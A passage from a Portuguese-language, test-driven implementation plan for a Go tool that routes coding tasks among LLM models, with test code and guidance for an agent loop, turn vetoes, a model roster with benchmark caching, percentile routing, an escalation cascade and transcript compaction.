		t.Errorf("a recusa deveria voltar como resultado com motivo: %+v", r)
	}
}

func TestRunStopsAtTurnCap(t *testing.T) {
	var s testsupport.Scenario
	for i := 0; i < 20; i++ {
		s = append(s, testsupport.Reply{
			ToolCalls:    []testsupport.ToolCall{{ID: "c", Name: "list_dir", Arguments: `{"path":"."}`}},
			FinishReason: "tool_calls"})
	}
	c, reg, cfg := setup(t, s)
	cfg.MaxTurns = 4

	out, _ := Run(context.Background(), c, reg, cfg, "explore", nil)
	if out.Stop != "teto_de_turnos" {
		t.Errorf("Stop = %q, quero teto_de_turnos", out.Stop)
	}
	if len(out.Turns) != 4 {
		t.Errorf("quero exatamente 4 turnos, tenho %d", len(out.Turns))
	}
}

func TestRunHonorsVeto(t *testing.T) {
	var s testsupport.Scenario
	for i := 0; i < 10; i++ {
		s = append(s, testsupport.Reply{
			ToolCalls:    []testsupport.ToolCall{{ID: "c", Name: "list_dir", Arguments: `{"path":"."}`}},
			FinishReason: "tool_calls"})
	}
	c, reg, cfg := setup(t, s)

	pre := func(turns []Turn) *Veto {
		if len(turns) >= 2 {
			return &Veto{Signal: "sem_progresso", Excerpt: "ls repetido", Probability: 0.9}
		}
		return nil
	}
	out, _ := Run(context.Background(), c, reg, cfg, "explore", pre)
	if out.Stop != "veto" {
		t.Errorf("Stop = %q, quero veto", out.Stop)
	}
	if len(out.Turns) != 2 {
		t.Errorf("o veto deveria cortar no turno 2, tenho %d", len(out.Turns))
	}
}

func TestRunAccumulatesUsageAcrossTurns(t *testing.T) {
	c, reg, cfg := setup(t, testsupport.Scenario{
		{ToolCalls: []testsupport.ToolCall{{ID: "c1", Name: "list_dir", Arguments: `{"path":"."}`}},
			FinishReason: "tool_calls"},
		{Content: "pronto", FinishReason: "stop"},
	})
	out, _ := Run(context.Background(), c, reg, cfg, "x", nil)
	if out.Usage.PromptTokens == 0 {
		t.Error("o uso total precisa somar os turnos")
	}
}
```

- [ ] **Step 2: Vermelho, implementar, verde**

Guia: o laço monta `[]llm.Message` começando por `system` (o briefing) e `user` (a tarefa), e a cada turno acrescenta a mensagem do assistente e uma mensagem `tool` por chamada, com o `tool_call_id` casando. A pré-condição é avaliada **depois** de registrar o turno e **antes** de pedir o próximo — vetar antes de registrar perderia a evidência do que causou o veto.

- [ ] **Step 3: Commit**

```bash
git add internal/agent && git commit -m "feat: laco de agente com teto de turnos e veto"
```

---

### Task 7: Pré-condição entre turnos

**Files:**
- Create: `internal/agent/precondition.go`
- Test: `internal/agent/precondition_test.go`

**Interfaces:**
- Consumes: `agent.Turn` (Task 6), `jev.WatchdogQuestions` (v1, verde).
- Produces:
  - `agent.PreConfig{RepeatThreshold, IdleTurns, ConsecutiveWindows int; NoProgress float64; CostCapUSD float64}`, `agent.DefaultPreConfig()`
  - `agent.NewPrecondition(cfg PreConfig, a Asker, costSoFar func() float64) Precondition`
  - `agent.Asker` — `Ask(ctx, state any, qs map[string]jev.Question) (jev.Result, error)`; `nil` desliga só a parte semântica.

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/agent/precondition_test.go
package agent

import (
	"context"
	"encoding/json"
	"testing"

	"github.com/heliowap/delegador/internal/jev"
	"github.com/heliowap/delegador/internal/llm"
	"github.com/heliowap/delegador/internal/tools"
)

type stubAsker struct{ noProgress float64 }

func (s stubAsker) Ask(context.Context, any, map[string]jev.Question) (jev.Result, error) {
	raw, _ := json.Marshal(map[string]any{
		"sem_progresso": map[string]any{"type": "noul", "noul": s.noProgress}})
	var a jev.Answers
	_ = json.Unmarshal(raw, &a)
	return jev.Result{Answers: a, Usage: jev.Usage{InputTokens: 50}}, nil
}

func turnsRepeating(n int) []Turn {
	var out []Turn
	for i := 0; i < n; i++ {
		out = append(out, Turn{Index: i,
			Message: llm.Message{ToolCalls: []tools.Call{{Name: "exec",
				Args: map[string]string{"command": "go test ./x/"}}}},
			Results: []tools.Result{{Output: "FAIL: no module", IsError: true}}})
	}
	return out
}

// Deterministico: mesma chamada, mesmo resultado, N vezes. Sem modelo.
func TestVetoesRepeatedIdenticalCall(t *testing.T) {
	cfg := DefaultPreConfig()
	pre := NewPrecondition(cfg, nil, func() float64 { return 0 })

	if v := pre(turnsRepeating(cfg.RepeatThreshold - 1)); v != nil {
		t.Error("abaixo do limiar nao deveria vetar")
	}
	v := pre(turnsRepeating(cfg.RepeatThreshold))
	if v == nil {
		t.Fatal("repeticao identica deveria vetar")
	}
	if v.Excerpt == "" {
		t.Error("o veto precisa carregar o trecho que o causou")
	}
	if v.Probability != 1 {
		t.Errorf("Probability = %v; sinal deterministico vale 1", v.Probability)
	}
}

// Falhar, mudar de abordagem e falhar de novo nao e travar.
func TestDoesNotVetoDifferentCalls(t *testing.T) {
	cfg := DefaultPreConfig()
	pre := NewPrecondition(cfg, nil, func() float64 { return 0 })

	var turns []Turn
	for i, cmd := range []string{"go test ./a/", "go test ./b/", "go test ./c/"} {
		turns = append(turns, Turn{Index: i,
			Message: llm.Message{ToolCalls: []tools.Call{{Name: "exec",
				Args: map[string]string{"command": cmd}}}},
			Results: []tools.Result{{Output: "FAIL", IsError: true}}})
	}
	if pre(turns) != nil {
		t.Error("comandos diferentes nao caracterizam repeticao")
	}
}

func TestVetoesOnCostCap(t *testing.T) {
	cfg := DefaultPreConfig()
	cfg.CostCapUSD = 0.50
	pre := NewPrecondition(cfg, nil, func() float64 { return 0.51 })

	v := pre([]Turn{{Index: 0}})
	if v == nil || v.Signal != "teto_de_custo" {
		t.Fatalf("teto de custo deveria vetar: %+v", v)
	}
}

// sem_progresso exige duas janelas consecutivas: um turno ruim e normal.
func TestSemanticVetoNeedsTwoConsecutiveWindows(t *testing.T) {
	cfg := DefaultPreConfig()
	cfg.RepeatThreshold = 99 // isola o sinal semantico
	pre := NewPrecondition(cfg, stubAsker{noProgress: 0.95}, func() float64 { return 0 })

	if v := pre(turnsRepeating(1)); v != nil {
		t.Error("uma janela so nao deveria vetar")
	}
	if v := pre(turnsRepeating(2)); v == nil || v.Signal != "sem_progresso" {
		t.Errorf("duas janelas consecutivas deveriam vetar: %+v", v)
	}
}

func TestSemanticVetoIgnoresLowProbability(t *testing.T) {
	cfg := DefaultPreConfig()
	cfg.RepeatThreshold = 99
	pre := NewPrecondition(cfg, stubAsker{noProgress: 0.2}, func() float64 { return 0 })

	pre(turnsRepeating(1))
	if v := pre(turnsRepeating(2)); v != nil {
		t.Errorf("probabilidade abaixo do limiar nao veta: %+v", v)
	}
}

// Sem Asker, so os sinais deterministicos operam — e o laco segue vivo.
func TestNilAskerDisablesOnlySemanticSignal(t *testing.T) {
	cfg := DefaultPreConfig()
	cfg.RepeatThreshold = 99
	pre := NewPrecondition(cfg, nil, func() float64 { return 0 })
	if v := pre(turnsRepeating(5)); v != nil {
		t.Errorf("sem Asker e sem repeticao, nao ha veto: %+v", v)
	}
}
```

- [ ] **Step 2: Vermelho, implementar, verde**

Guia: o estado da sequência de janelas mora no closure devolvido por `NewPrecondition` — é o que permite exigir duas consecutivas sem estado global. Só chame o Jev quando houver turno novo e a janela tiver tamanho que justifique; respeite o orçamento de state com `jev.StateBudget`, que já existe e está verde. Falha de rede no Jev **não veta**: devolva `nil` e siga.

- [ ] **Step 3: Commit**

```bash
git add internal/agent && git commit -m "feat: pre-condicao entre turnos, deterministica e semantica"
```

---

### Task 8: Roster e sondagem de viabilidade

**Files:**
- Create: `internal/roster/roster.go`, `internal/roster/probe.go`
- Test: `internal/roster/roster_test.go`

**Interfaces:**
- Produces:
  - `roster.Model{ID, Permaslug, Papel, Mapeamento string; Sondado Probe; Benchmark *Benchmark; CustoUSDPorMTok *float64; Habilitado bool}`
  - `roster.Probe{ToolCall, ReasoningContent bool; TokensBase int; LatenciaS float64; Em time.Time}`
  - `roster.Benchmark{CodingIndex, IntelligenceIndex, AgenticIndex, TauBench, TauBenchDesvio, CustoPorTarefaUSD float64}`
  - `roster.Load(path string) ([]Model, error)` — lê o YAML de [`config/roster.yaml`](../../config/roster.yaml).
  - `roster.Elegiveis(ms []Model, maxIdade time.Duration, agora time.Time) ([]Model, []string)` — devolve os utilizáveis e os motivos de exclusão dos demais.
  - `roster.ProbeModel(ctx, c *llm.Client, id string) (Probe, error)`
  - `roster.FetchBenchmarks(ctx, apiKey, cachePath string, ttl time.Duration) (map[string]Benchmark, error)` — indexado por permaslug, com cache em disco honrando a cota do OpenRouter (30/min, 500/dia).

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/roster/roster_test.go
package roster

import (
	"context"
	"path/filepath"
	"testing"
	"time"

	"github.com/heliowap/delegador/internal/llm"
	"github.com/heliowap/delegador/internal/testsupport"
)

func TestLoadReadsRealRoster(t *testing.T) {
	ms, err := Load(filepath.Join("..", "..", "config", "roster.yaml"))
	if err != nil {
		t.Fatalf("Load: %v", err)
	}
	if len(ms) != 6 {
		t.Fatalf("quero 6 modelos, tenho %d", len(ms))
	}
	byID := map[string]Model{}
	for _, m := range ms {
		byID[m.ID] = m
	}
	glm, ok := byID["cpa-fw-glm-5.3-flash"]
	if !ok {
		t.Fatal("glm ausente")
	}
	if glm.Benchmark == nil || glm.Benchmark.TauBench != 0.758 {
		t.Errorf("benchmark do glm: %+v", glm.Benchmark)
	}
	if glm.Sondado.TokensBase != 162 {
		t.Errorf("TokensBase = %d, quero 162", glm.Sondado.TokensBase)
	}
	swe := byID["devin/swe-2"]
	if swe.Benchmark != nil {
		t.Error("swe-2 nao tem benchmark; nil e o valor certo, nao zero")
	}
	if swe.Papel != "barato" {
		t.Errorf("Papel do swe-2 = %q, quero barato", swe.Papel)
	}
}

// Custo nulo nao vira zero: modelo sem custo declarado nao compete por preco.
func TestElegiveisExcluiSemCusto(t *testing.T) {
	ms, err := Load(filepath.Join("..", "..", "config", "roster.yaml"))
	if err != nil {
		t.Fatal(err)
	}
	ok, motivos := Elegiveis(ms, 30*24*time.Hour, time.Date(2026, 9, 21, 0, 0, 0, 0, time.UTC))
	if len(ok) != 0 {
		t.Errorf("nenhum tem custo preenchido; quero 0 elegiveis, tenho %d", len(ok))
	}
	if len(motivos) != 6 {
		t.Errorf("quero 6 motivos de exclusao, tenho %d", len(motivos))
	}
}

func TestElegiveisExcluiSondagemVelhaOuSemToolCall(t *testing.T) {
	custo := 0.15
	base := Model{ID: "m", Habilitado: true, CustoUSDPorMTok: &custo,
		Sondado: Probe{ToolCall: true, Em: time.Date(2026, 9, 20, 0, 0, 0, 0, time.UTC)}}
	agora := time.Date(2026, 12, 1, 0, 0, 0, 0, time.UTC)

	velho, motivos := Elegiveis([]Model{base}, 30*24*time.Hour, agora)
	if len(velho) != 0 || len(motivos) != 1 {
		t.Errorf("sondagem velha deveria excluir: %v / %v", velho, motivos)
	}

	semTool := base
	semTool.Sondado.ToolCall = false
	semTool.Sondado.Em = agora
	if ok, _ := Elegiveis([]Model{semTool}, 30*24*time.Hour, agora); len(ok) != 0 {
		t.Error("modelo sem tool call nao executa tarefa nenhuma")
	}

	bom := base
	bom.Sondado.Em = agora
	if ok, _ := Elegiveis([]Model{bom}, 30*24*time.Hour, agora); len(ok) != 1 {
		t.Error("modelo sondado, habilitado e com custo deveria passar")
	}
}

func TestProbeModelMedeCapacidades(t *testing.T) {
	url, _ := testsupport.StartFakeAPI(t, testsupport.Scenario{{
		ToolCalls:        []testsupport.ToolCall{{ID: "c1", Name: "read_file", Arguments: `{"path":"go.mod"}`}},
		ReasoningContent: "pensando",
		FinishReason:     "tool_calls",
	}})
	p, err := ProbeModel(context.Background(), llm.New(llm.Options{BaseURL: url, APIKey: "k"}), "x")
	if err != nil {
		t.Fatalf("ProbeModel: %v", err)
	}
	if !p.ToolCall || !p.ReasoningContent || p.TokensBase == 0 || p.Em.IsZero() {
		t.Errorf("sondagem incompleta: %+v", p)
	}
}
```

- [ ] **Step 2: Vermelho, implementar, verde**

Guia: sem dependência, então o YAML é parseado à mão — o formato do roster é fixo e raso, e um parser de 80 linhas cobre. Se ficar frágil, converta o arquivo para JSON em vez de adicionar dependência. `Elegiveis` devolve motivos porque **exclusão silenciosa é o pior modo de falha aqui**: o usuário precisa saber que o modelo dele saiu da rota e por quê.

- [ ] **Step 3: Cache de benchmark**

```go
// acrescentar a internal/roster/roster_test.go

// O cache existe por causa da cota: 30 req/min e 500/dia. Segunda chamada
// dentro do TTL nao pode tocar a rede.
func TestFetchBenchmarksUsaCacheDentroDoTTL(t *testing.T) {
	var chamadas int
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		chamadas++
		io.WriteString(w, `{"data":[{"source":"artificial-analysis",`+
			`"model_permaslug":"z-ai/glm-5.3-flash-20260826","coding_index":71.5,`+
			`"intelligence_index":41.8,"agentic_index":50.9}],`+
			`"meta":{"as_of":"2026-09-20T00:03:27Z"}}`)
	}))
	defer srv.Close()
	t.Setenv("OPENROUTER_BASE_URL", srv.URL)

	cache := filepath.Join(t.TempDir(), "bench.json")
	for i := 0; i < 3; i++ {
		b, err := FetchBenchmarks(context.Background(), "k", cache, time.Hour)
		if err != nil {
			t.Fatalf("FetchBenchmarks: %v", err)
		}
		if b["z-ai/glm-5.3-flash-20260826"].CodingIndex != 71.5 {
			t.Fatalf("indice nao veio: %+v", b)
		}
	}
	if chamadas != 1 {
		t.Errorf("tocou a rede %d vezes; o cache deveria segurar em 1", chamadas)
	}
}

// Cota estourada nao invalida o que ja se sabe: cache vencido e melhor que
// nada, e o chamador precisa saber que esta velho.
func TestFetchBenchmarksDegradaParaCacheVencido(t *testing.T) {
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusTooManyRequests)
	}))
	defer srv.Close()
	t.Setenv("OPENROUTER_BASE_URL", srv.URL)

	cache := filepath.Join(t.TempDir(), "bench.json")
	if err := os.WriteFile(cache, []byte(`{"as_of":"2020-01-01T00:00:00Z","dados":`+
		`{"z-ai/glm-5.3-flash-20260826":{"coding_index":71.5}}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	b, err := FetchBenchmarks(context.Background(), "k", cache, time.Nanosecond)
	if err != nil {
		t.Fatalf("cache vencido com rede fora nao deveria ser erro fatal: %v", err)
	}
	if b["z-ai/glm-5.3-flash-20260826"].CodingIndex != 71.5 {
		t.Error("deveria ter degradado para o cache vencido")
	}
}
```

Guia: a fonte `artificial-analysis` traz os três índices; a fonte `openrouter` com `benchmark_type: tau_bench_verified_airline` traz `accuracy`, `accuracy_stddev` e `avg_cost_per_task`. Junte as duas por permaslug. Ignore `design-arena` — é elo de categoria de UI e não serve para rotear código.

- [ ] **Step 4: Commit**

```bash
git add internal/roster && git commit -m "feat: roster com elegibilidade explicada e cache de benchmark"
```

---

### Task 9: Rota

**Files:**
- Create: `internal/route/route.go`
- Test: `internal/route/route_test.go`

**Interfaces:**
- Consumes: `roster.Model` (Task 8), `jev` (v1).
- Produces:
  - `route.Dimensao` — `Mecanica`, `Raciocinio`, `Agentica`.
  - `route.Escolha{Modelo roster.Model; Dimensao Dimensao; Percentil float64; NaoMedido bool; Motivo string}`
  - `route.Escolher(ms []roster.Model, d Dimensao, percentil float64) (Escolha, error)`
  - `route.Classificar(ctx, a Asker, briefing string) (Dimensao, float64, jev.Usage, error)` — Jev responde `dimensao_dominante` e `complexidade`; o Score vira percentil.

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/route/route_test.go
package route

import (
	"testing"

	"github.com/heliowap/delegador/internal/roster"
)

func m(id string, cod, intel, tau, custoTarefa, precoMTok float64) roster.Model {
	p := precoMTok
	return roster.Model{ID: id, Habilitado: true, CustoUSDPorMTok: &p,
		Sondado:   roster.Probe{ToolCall: true},
		Benchmark: &roster.Benchmark{CodingIndex: cod, IntelligenceIndex: intel,
			TauBench: tau, CustoPorTarefaUSD: custoTarefa}}
}

func candidatos() []roster.Model {
	return []roster.Model{
		m("glm", 71.5, 41.8, 0.758, 0.0061, 0.15),
		m("deepseek", 69.1, 34.3, 0.730, 0.0075, 0.11),
		m("fable", 81.6, 53.4, 0.783, 0.7261, 5.00),
		m("opus", 78.0, 50.8, 0.792, 0.4930, 5.50),
	}
}

// Entre os que passam o corte, vence o menor custo POR TAREFA — nao o menor
// preco por token. Verbosidade e custo.
func TestEscolheMaisBaratoPorTarefaAcimaDoCorte(t *testing.T) {
	e, err := Escolher(candidatos(), Mecanica, 0.25)
	if err != nil {
		t.Fatalf("Escolher: %v", err)
	}
	if e.Modelo.ID != "glm" {
		t.Errorf("ID = %q, quero glm", e.Modelo.ID)
	}
}

func TestCorteAltoExcluiOsBaratos(t *testing.T) {
	e, err := Escolher(candidatos(), Mecanica, 0.90)
	if err != nil {
		t.Fatalf("Escolher: %v", err)
	}
	if e.Modelo.ID != "fable" {
		t.Errorf("ID = %q, quero fable (maior coding_index)", e.Modelo.ID)
	}
}

// Dimensao agentica usa tau_bench, nao coding_index.
func TestDimensaoAgenticaUsaTauBench(t *testing.T) {
	e, _ := Escolher(candidatos(), Agentica, 0.95)
	if e.Modelo.ID != "opus" {
		t.Errorf("ID = %q, quero opus (maior tau_bench)", e.Modelo.ID)
	}
}

// Percentil e dentro do roster: os indices nao sao comparaveis entre si.
// coding_index vai a 81.6; agentic_index a 57.9. Corte absoluto seria erro.
func TestPercentilEhRelativoAoRoster(t *testing.T) {
	poucos := []roster.Model{m("a", 10, 10, 0.10, 0.01, 0.1), m("b", 12, 12, 0.12, 0.02, 0.1)}
	e, err := Escolher(poucos, Mecanica, 0.90)
	if err != nil {
		t.Fatalf("roster fraco ainda deve escolher alguem: %v", err)
	}
	if e.Modelo.ID != "b" {
		t.Errorf("ID = %q, quero b", e.Modelo.ID)
	}
}

// Sem nota entra por viabilidade e custo, marcado. Ausencia de nota nao e
// nota baixa, e tratar como zero excluiria o modelo para sempre.
func TestSemBenchmarkEntraMarcado(t *testing.T) {
	c := 0.0
	semNota := roster.Model{ID: "swe-2", Habilitado: true, CustoUSDPorMTok: &c,
		Sondado: roster.Probe{ToolCall: true}, Benchmark: nil}

	e, err := Escolher([]roster.Model{semNota}, Mecanica, 0.50)
	if err != nil {
		t.Fatalf("Escolher: %v", err)
	}
	if e.Modelo.ID != "swe-2" || !e.NaoMedido {
		t.Errorf("escolha = %+v; quero swe-2 marcado como nao medido", e)
	}
	if e.Motivo == "" {
		t.Error("o relatorio precisa saber por que um nao medido foi escolhido")
	}
}

func TestSemCandidatoDaErro(t *testing.T) {
	if _, err := Escolher(nil, Mecanica, 0.5); err == nil {
		t.Error("quero erro com roster vazio")
	}
}
```

- [ ] **Step 2: Vermelho, implementar, verde**

Guia: percentil é posição **dentro dos candidatos**, calculada por ordenação no índice da dimensão — nunca valor absoluto, porque `coding_index` e `agentic_index` vivem em escalas diferentes. Modelos sem benchmark saem do cálculo do percentil (senão distorcem a distribuição) e entram na lista final marcados. Se ninguém passar o corte, use o melhor disponível e registre no `Motivo` — devolver erro aqui pararia o trabalho por excesso de zelo.

- [ ] **Step 3: Commit**

```bash
git add internal/route && git commit -m "feat: rota por dimensao com percentil e custo por tarefa"
```

---

### Task 10: Perguntas Jev do v2

**Files:**
- Modify: `internal/jev/questions.go`
- Test: `internal/jev/questions_test.go` (estender), `evals/fixtures.json` (estender)

**Interfaces:**
- Produces: `jev.RouteQuestions()` passa a incluir `dimensao_dominante` (Choice) e mantém `complexidade` (Score); nova `jev.AutonomyQuestion()` com `tarefa_autocontida` (Noul); `bloqueio_de_permissao` sai de `jev.WatchdogQuestions()`.

- [ ] **Step 1: Escrever o teste que falha**

```go
// acrescentar a internal/jev/questions_test.go

func TestDimensaoDominanteTemAsTresComBenchmark(t *testing.T) {
	ch, ok := RouteQuestions()["dimensao_dominante"].(Choice)
	if !ok {
		t.Fatal("dimensao_dominante deveria ser Choice")
	}
	// As opcoes existem porque as tres tem coluna de benchmark. Dimensao sem
	// medida correspondente seria resposta bonita que o codigo nao usa.
	for _, o := range []string{"mecanica", "raciocinio", "agentica"} {
		if _, ok := ch.Criteria[o]; !ok {
			t.Errorf("opcao %q ausente", o)
		}
	}
	if len(ch.Criteria) != 3 {
		t.Errorf("quero exatamente 3 opcoes, tenho %d", len(ch.Criteria))
	}
}

func TestTarefaAutocontidaExiste(t *testing.T) {
	n, ok := AutonomyQuestion()["tarefa_autocontida"].(Noul)
	if !ok {
		t.Fatal("tarefa_autocontida deveria ser Noul")
	}
	if n.Criteria == nil || n.Criteria.True == "" || n.Criteria.False == "" {
		t.Error("a fronteira entre transcrever e decidir precisa estar descrita")
	}
}

// Saiu do Jev quando a permissao virou allowlist em codigo: o estado que ela
// detectava nao existe mais.
func TestBloqueioDePermissaoNaoEhMaisPerguntaJev(t *testing.T) {
	if _, existe := WatchdogQuestions()["bloqueio_de_permissao"]; existe {
		t.Error("bloqueio_de_permissao deveria ter saido do conjunto")
	}
	if len(WatchdogQuestions()) != 1 {
		t.Errorf("o watchdog do v2 tem uma pergunta so, tem %d", len(WatchdogQuestions()))
	}
}
```

- [ ] **Step 2: Vermelho, implementar, verde**

Guia para `tarefa_autocontida`: a fronteira vem de medição, não de intuição. 16 das 18 tarefas do plano v1 eram 72-91% código literal, e o `swe-2` executou oito com fidelidade e morreu na primeira que exigia montagem. `true` = o briefing determina o que fazer a ponto de executar ser transcrever; `false` = exige decidir no caminho. Isso muda a rota: tarefa autocontida **grande** cabe num modelo barato; tarefa **pequena** que exige decisão, não.

Acrescente fixtures a `evals/` para as três perguntas novas, com pelo menos um caso claramente `true` e um claramente `false` cada.

- [ ] **Step 3: Commit**

```bash
go test ./internal/jev/ -v && git add internal/jev evals
git commit -m "feat: perguntas de dimensao e autocontencao; remove bloqueio_de_permissao"
```

---

### Task 11: Cascata

**Files:**
- Create: `internal/cascade/cascade.go`
- Test: `internal/cascade/cascade_test.go`

**Interfaces:**
- Consumes: `route.Escolha`, `verify.Report` (Task 12), `agent.Outcome`.
- Produces:
  - `cascade.Decisao{Escala bool; Motivo string; NovoPercentil float64}`
  - `cascade.Avaliar(out agent.Outcome, rep verify.Report, tentativa int, cfg Config) Decisao`
  - `cascade.Config{MaxEscaladas int; DegrauPercentil float64}`, `cascade.DefaultConfig()`

- [ ] **Step 1: Escrever o teste que falha**

```go
// internal/cascade/cascade_test.go
package cascade

import (
	"testing"

	"github.com/heliowap/delegador/internal/agent"
	"github.com/heliowap/delegador/internal/verify"
)

func verde() verify.Report {
	return verify.Report{Steps: []verify.Step{{Name: "teste", ExitCode: 0}}, MutationProved: true}
}
func vermelho() verify.Report {
	return verify.Report{Steps: []verify.Step{{Name: "teste", ExitCode: 1}}}
}

func TestNaoEscalaComVerificacaoVerde(t *testing.T) {
	d := Avaliar(agent.Outcome{Stop: "final"}, verde(), 0, DefaultConfig())
	if d.Escala {
		t.Error("verde nao escala")
	}
}

func TestEscalaComVerificacaoVermelha(t *testing.T) {
	cfg := DefaultConfig()
	d := Avaliar(agent.Outcome{Stop: "final"}, vermelho(), 0, cfg)
	if !d.Escala {
		t.Fatal("falha de verificacao deveria escalar")
	}
	if d.NovoPercentil <= 0 {
		t.Error("a escalada precisa elevar o corte")
	}
}

// A regra mais importante: recusa de permissao e teto de custo nao sao falha
// do modelo. Escalar aqui e pagar caro por erro de ambiente.
func TestNaoEscalaPorVetoDeCusto(t *testing.T) {
	d := Avaliar(agent.Outcome{Stop: "veto", Veto: &agent.Veto{Signal: "teto_de_custo"}},
		vermelho(), 0, DefaultConfig())
	if d.Escala {
		t.Error("teto de custo nao e falha do modelo")
	}
	if d.Motivo == "" {
		t.Error("o relatorio precisa saber por que nao escalou")
	}
}

func TestNaoEscalaQuandoNadaFoiExecutado(t *testing.T) {
	d := Avaliar(agent.Outcome{Stop: "erro"}, verify.Report{}, 0, DefaultConfig())
	if d.Escala {
		t.Error("erro de execucao nao e falha de qualidade")
	}
}

func TestRespeitaTetoDeEscaladas(t *testing.T) {
	cfg := DefaultConfig()
	if cfg.MaxEscaladas != 1 {
		t.Fatalf("o padrao deve ser uma escalada, e %d", cfg.MaxEscaladas)
	}
	d := Avaliar(agent.Outcome{Stop: "final"}, vermelho(), cfg.MaxEscaladas, cfg)
	if d.Escala {
		t.Error("teto atingido nao escala; o caso vai para o humano")
	}
}

// Teste que passa com a correcao desfeita nao prova nada — e motivo de
// escalada tanto quanto suite vermelha.
func TestEscalaQuandoMutacaoNaoProvaNada(t *testing.T) {
	rep := verify.Report{Steps: []verify.Step{{Name: "teste", ExitCode: 0}}, MutationProved: false}
	if d := Avaliar(agent.Outcome{Stop: "final"}, rep, 0, DefaultConfig()); !d.Escala {
		t.Error("mutacao que nao prova nada deveria escalar")
	}
}
```

Acrescente `Veto *Veto` a `agent.Outcome` na Task 6 — a cascata precisa saber **por que** o laço parou, não só que parou.

- [ ] **Step 2: Vermelho, implementar, verde**

- [ ] **Step 3: Commit**

```bash
git add internal/cascade internal/agent && git commit -m "feat: cascata escala so por falha provada"
```

---

### Task 12: Verificação, gates e briefing (portados do v1)

**Files:**
- Create: `internal/verify/verify.go`, `internal/gitx/*.go`, `internal/gate/*.go`
- Test: portados do plano v1

**Interfaces:**
- Produces: idênticos ao v1 — `verify.Run`, `verify.Report` (com `Green()` e `Step(name)`), `gitx.Diff`/`DiffStat`/`RevertNonTest`, `gate.BuildBriefing`, `gate.Check`, `gate.SelectEvidence`.

- [ ] **Step 1: Portar do plano v1**

Estas três camadas não mudam com o v2: verificação é código, gates são Jev sobre texto, e nenhuma delas toca o executor. Use as tarefas **9 e 13 do [plano v1](2026-09-20-devin-plugin-cc.md)** literalmente — testes e implementação — trocando apenas o module path.

Duas adaptações obrigatórias:

1. `gate.Check` ganha a pergunta `tarefa_autocontida` (Task 10) no mesmo request — perguntas independentes sobre o mesmo state vão juntas.
2. `devin.ListModels` do v1 vira `roster.Load` (Task 8); o `plan` não executa mais `devin models list`.

- [ ] **Step 2: Verde e commit**

O teste que não pode faltar é o `TestRunFlagsTestThatProvesNothing`: ele monta um repo git real com uma correção e um teste que passa **mesmo com a correção desfeita**, e exige que a mutação acuse. É o que sustenta a cascata inteira.

```bash
go test ./internal/verify/ ./internal/gitx/ ./internal/gate/ -v
git commit -m "feat: verificacao, gates e briefing portados do v1"
```

---

### Task 13: Resultado — compactação, divergência e orçamento

O que chega ao orquestrador. Spec §6.6 e §9.

**Files:**
- Create: `internal/compact/compact.go`, `internal/render/result.go`, `internal/ledger/ledger.go`
- Test: `internal/compact/compact_test.go`, `internal/render/result_test.go`, `internal/ledger/ledger_test.go`

**Interfaces:**
- Consumes: `agent.Turn` (Task 6), `verify.Report` (Task 12), `jev` (v1).
- Produces:
  - `compact.Turns(ctx, a Asker, tarefa string, turns []agent.Turn) ([]agent.Turn, jev.Usage, error)` — dois nouls por interação, **só deleta, nunca reescreve**.
  - `compact.AfirmaVerde(ctx, a Asker, relatorio string) (float64, jev.Usage, error)`
  - `render.Result(w io.Writer, in Input)` com `Input{Job *job.Job; Verify verify.Report; Turns []agent.Turn; AfirmaVerde float64; Escolha route.Escolha; Escalou bool; JevUSD, ExecutorUSD float64}`
  - `ledger.Ledger{Path string}` com `Record(kind string, inTok, outTok int, usdPorMTokIn, usdPorMTokOut float64) error` e `Total() (usd float64, err error)`.

- [ ] **Step 1: Escrever o teste da compactação**

```go
// internal/compact/compact_test.go
package compact

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/heliowap/delegador/internal/agent"
	"github.com/heliowap/delegador/internal/jev"
	"github.com/heliowap/delegador/internal/llm"
	"github.com/heliowap/delegador/internal/tools"
)

type porID struct{ manter map[string]bool }

func (b porID) Ask(_ context.Context, state any, _ map[string]jev.Question) (jev.Result, error) {
	id := state.(map[string]any)["interacao"].(map[string]any)["id"].(string)
	v := 0.1
	if b.manter[id] {
		v = 0.95
	}
	raw, _ := json.Marshal(map[string]any{
		"chamada_necessaria":            map[string]any{"type": "noul", "noul": v},
		"resultado_necessario_verbatim": map[string]any{"type": "noul", "noul": v}})
	var a jev.Answers
	_ = json.Unmarshal(raw, &a)
	return jev.Result{Answers: a, Usage: jev.Usage{InputTokens: 10}}, nil
}

func amostra() []agent.Turn {
	mk := func(i int, id, cmd, out string) agent.Turn {
		return agent.Turn{Index: i,
			Message: llm.Message{ToolCalls: []tools.Call{{Name: "exec",
				Args: map[string]string{"command": cmd, "_id": id}}}},
			Results: []tools.Result{{Output: out}}}
	}
	return []agent.Turn{
		mk(0, "t0", "ls", "total 4"),
		mk(1, "t1", "go test ./x/", "FAIL: TestSoma"),
		mk(2, "t2", "edit soma.go", "1 hunk"),
	}
}

// Delecao, nunca reescrita: o que fica, fica palavra por palavra.
func TestTurnsDeletaSemReescrever(t *testing.T) {
	kept, _, err := Turns(context.Background(), porID{manter: map[string]bool{"t1": true, "t2": true}},
		"tarefa", amostra())
	if err != nil {
		t.Fatalf("Turns: %v", err)
	}
	if len(kept) != 2 {
		t.Fatalf("quero 2 turnos mantidos, tenho %d", len(kept))
	}
	if kept[0].Results[0].Output != "FAIL: TestSoma" {
		t.Errorf("resultado foi reescrito: %q", kept[0].Results[0].Output)
	}
}

func TestTurnsTruncaDeclarandoOTruncamento(t *testing.T) {
	ruido := strings.Repeat("saida de build sem valor de conferencia\n", 200)
	turns := []agent.Turn{{Index: 0,
		Message: llm.Message{ToolCalls: []tools.Call{{Name: "exec",
			Args: map[string]string{"command": "go build", "_id": "t0"}}}},
		Results: []tools.Result{{Output: ruido}}}}

	// mantem a chamada, descarta o resultado verbatim
	kept, _, err := Turns(context.Background(), meioAMeio{}, "tarefa", turns)
	if err != nil {
		t.Fatalf("Turns: %v", err)
	}
	out := kept[0].Results[0].Output
	if len(out) >= len(ruido) {
		t.Error("deveria ter truncado")
	}
	if !strings.Contains(out, "truncado") {
